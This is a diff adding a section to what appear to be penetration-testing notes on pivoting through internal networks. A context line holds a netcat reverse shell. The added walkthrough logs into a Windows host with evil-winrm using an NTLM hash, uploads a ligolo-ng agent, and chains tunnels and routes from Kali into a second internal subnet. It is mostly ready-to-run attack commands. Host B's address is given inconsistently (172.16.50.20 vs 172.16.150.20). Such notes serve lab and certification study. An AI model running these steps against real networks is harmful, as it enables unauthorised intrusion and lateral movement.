@@ -123,3 +123,43 @@ nc 172.16.150.10 9002 -e /bin/sh
 
 # Now we successfully got a shell from the Host B (172.16.50.20) to our Kali
 ```
+
+## Easy Double Pivot
+### Establishing the Second Pivot
+Given the following situation:
+- We got access to the first internal network (172.16.150.0/24) through Administrator access at Pivot Host A (172.16.150.10).
+- The Host B as access to another internal network (172.16.200.0/24).
+- We will set a Second Pivot at Host B (172.16.150.20) to access the second internal network (172.16.200.0/24).
+
+To achieve that, we can do the following:
+```shell
+# Connect with evil-winrm
+evil-winrm -i 172.16.150.10 -u Administrator -H <NTLM_hash>
+
+# Upload ligolo-ng agent.exe
+upload agent.exe
+
+# Set up a new ligolo interface on Kali
+sudo ip tuntap add user Vorkharium mode tun ligolo2
+sudo ip link set ligolo2 up
+
+# Add the second internal network
+sudo ip route add 172.16.200.0/24 dev ligolo2
+
+# On the Ligolo-Ng current session, create a new listener connecting to the Port 11601 of the first session
+listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601
+
+# Run the agent.exe to create a connection from the Second Pivot Host to the First Pivot Host
+./agent.exe --connect 172.16.150.10:11601 -ignore-cert
+
+# On Ligolo-Ng console - Show sessions
+ligolo-ng » session
+
+# Select the new session created from the Second Pivot Host
+? Specify a session : 2 # automotors\Administrator@DC01 (Example of the name of the second pivot host)
+
+# Start new Ligolo-Ng session using the new interface "ligolo2" so it won't interfere with the first interface "ligolo"
+[Agent : automotors\Administrator@DC01] » start --tun ligolo2
+
+# Now we can access the second internal network 172.16.200.0/24
+```
